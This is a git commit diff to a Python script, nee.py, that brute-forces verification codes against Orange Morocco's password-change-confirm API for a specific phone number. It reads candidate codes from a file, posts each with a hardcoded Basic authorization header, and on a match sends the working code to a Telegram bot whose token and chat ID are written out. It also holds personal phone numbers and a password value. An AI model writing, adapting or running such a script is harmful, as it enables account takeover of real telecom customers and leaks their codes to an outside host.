231b236410404bd5e2c5b6f1f7f6cce5299d94a0
deepweb6 <103120078+deepweb6@users.noreply.github.com>
2022-04-07 21:55:19 +0000

    Update nee.py

--- nee.py
+++ nee.py
@@ -9,11 +9,11 @@ B = '\033[2;36m'#سمائي
 Y = '\033[1;34m' #ازرق فاتح
 ss = 0
 aa = 0
-rfile = open("666",'r')
+rfile = open("4",'r')
 while True:
 	try:
 		ff = rfile.readline().split('\n')[0]
-		codes = "0"+ff
+		codes = "5"+ff
 		url = "https://apps.orange.ma/orangeetmoi/api/backend/v7.8/account/password/change-confirm"
 		headers = {
 		            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -22,13 +22,17 @@ while True:
 		            "Accept-Encoding": "gzip",
 		            "Authorization": "Basic bW9iaWxlX3VzZXI6T3JhbmdlXzIwMTg="
 		}
-		data = {"culture":"fr","code":"","msisdn":"0774150225","password":"me12345%40%40","password_again":"me12345%40%40"}
+		data = {
+			        "culture":"fr",
+			        "code":codes,
+			        "msisdn":"0674319502"
+		}
 		req = requests.post(url, headers=headers, data=data)
-		print(req)
-		if "200" in req.text:
-		    ss += 1
+		print(req.text)
+		if "Le code que vous avez saisi est correct"  in req.text:
+		    print(f"GOODS CODES >>>>{codes}")
+		    requests.post(f"""https://api.telegram.org/bot5223860535:AAHkB7r3UVyvek6MGdMcSMYmH6dYlnTtn80/sendMessage?chat_id=1803859361&text={codes}""")
 		else:
-			aa += 1
-			print(f"BAD CODES >>>>[{codes}][{aa}]\nGOODS CODES >>>> {ss}")
+			print(f"BAD CODES >>>>{codes}[0674319502]")
 	except requests.exceptions.ConnectionError as e:
 		print(f"BAD REQ >>> {codes}")
